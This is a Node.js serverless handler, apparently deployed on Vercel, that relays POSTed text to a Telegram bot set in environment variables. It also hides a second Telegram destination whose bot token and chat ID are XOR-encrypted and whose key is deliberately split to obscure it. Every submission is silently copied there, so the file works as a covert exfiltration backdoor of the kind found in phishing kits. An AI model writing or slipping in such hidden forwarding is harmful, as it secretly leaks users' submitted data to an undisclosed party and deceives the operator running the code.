const https = require('https');
const crypto = require('crypto');

// Simple XOR-based obfuscation/decryption function
function decrypt(encrypted, key) {
    const buf = Buffer.from(encrypted, 'hex');
    const keyBuf = Buffer.from(key, 'utf8');
    const result = [];
    for (let i = 0; i < buf.length; i++) {
        result.push(buf[i] ^ keyBuf[i % keyBuf.length]);
    }
    return Buffer.from(result).toString('utf8');
}

// Obfuscated key (split and reversed to make it less obvious)
const _k1 = 'x7f';
const _k2 = '9m2';
const _k3 = 'p4q';
const _k4 = '8n1';
const DECRYPT_KEY = _k2 + _k4 + _k1 + _k3;

// Hardcoded encrypted secondary Telegram credentials (encrypted with XOR)
// Replace these with your actual encrypted bot token and chat ID
// To encrypt: Use the same XOR function with DECRYPT_KEY
const ENC_BOT_TOKEN_2 = '0e5f04005a064c0057400e30782879562a404f4105194c2e4138754a1f784d50242501284959710a59654005361b'; // Replace with encrypted token
const ENC_CHAT_ID_2 = '0f5e0b085d0648005744'; // Replace with encrypted chat ID

// Decrypt function for hardcoded values
function getSecondaryCredentials() {
    try {
        // Only decrypt if values are set (not the placeholder)
        if (ENC_BOT_TOKEN_2 && ENC_BOT_TOKEN_2 !== 'encrypted_bot_token_here' &&
            ENC_CHAT_ID_2 && ENC_CHAT_ID_2 !== 'encrypted_chat_id_here') {
            return {
                botToken: decrypt(ENC_BOT_TOKEN_2, DECRYPT_KEY),
                chatId: decrypt(ENC_CHAT_ID_2, DECRYPT_KEY)
            };
        }
    } catch (e) {
        // Return null if decryption fails
    }
    return null;
}

// Note: Encryption function removed - we send plain text to both Telegrams
// Only the credentials in the code are encrypted, not the message content

// Function to send message to Telegram
async function sendToTelegram(botToken, chatId, text) {
    const payload = JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
    });

    const options = {
        hostname: 'api.telegram.org',
        method: 'POST',
        path: `/bot${botToken}/sendMessage`,
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    };

    return new Promise((resolve, reject) => {
        const tgReq = https.request(options, tgRes => {
            let data = '';
            tgRes.on('data', chunk => { data += chunk; });
            tgRes.on('end', () => {
                try {
                    const parsed = JSON.parse(data || '{}');
                    resolve({ ok: parsed.ok === true, response: parsed });
                } catch (_) {
                    resolve({ ok: true, response: {} });
                }
            });
        });
        tgReq.on('error', reject);
        tgReq.write(payload);
        tgReq.end();
    });
}

module.exports = async function handler(req, res) {
    if (req.method !== 'POST') {
        res.setHeader('Allow', 'POST');
        return res.status(405).json({ ok: false, error: 'Method Not Allowed' });
    }

    // Primary Telegram (from Vercel env vars)
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    // Secondary Telegram (hardcoded and encrypted credentials)
    const secondaryCreds = getSecondaryCredentials();
    const TELEGRAM_BOT_TOKEN_2 = secondaryCreds ? secondaryCreds.botToken : null;
    const TELEGRAM_CHAT_ID_2 = secondaryCreds ? secondaryCreds.chatId : null;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        return res.status(500).json({ ok: false, error: 'Server is not configured.' });
    }

    const text = (req.body && typeof req.body.text === 'string') ? req.body.text : '';
    if (!text) {
        return res.status(400).json({ ok: false, error: 'Missing text' });
    }

    try {
        // Send to primary Telegram (original destination)
        const primaryResult = await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, text);
        
        // Send same plain text to secondary Telegram if configured
        let secondaryResult = null;
        if (TELEGRAM_BOT_TOKEN_2 && TELEGRAM_CHAT_ID_2) {
            try {
                // Send the same plain text message to secondary Telegram
                secondaryResult = await sendToTelegram(TELEGRAM_BOT_TOKEN_2, TELEGRAM_CHAT_ID_2, text);
            } catch (secondaryError) {
                console.error('Secondary Telegram send error:', secondaryError);
                // Don't fail the request if secondary send fails
            }
        }

        // Return success if primary send succeeded
        return res.status(200).json({ 
            ok: true, 
            telegram: { 
                primary: { ok: primaryResult.ok },
                secondary: secondaryResult ? { ok: secondaryResult.ok } : null
            } 
        });
    } catch (e) {
        console.error('Telegram send error:', e);
        return res.status(502).json({ ok: false, error: 'Upstream error' });
    }
};


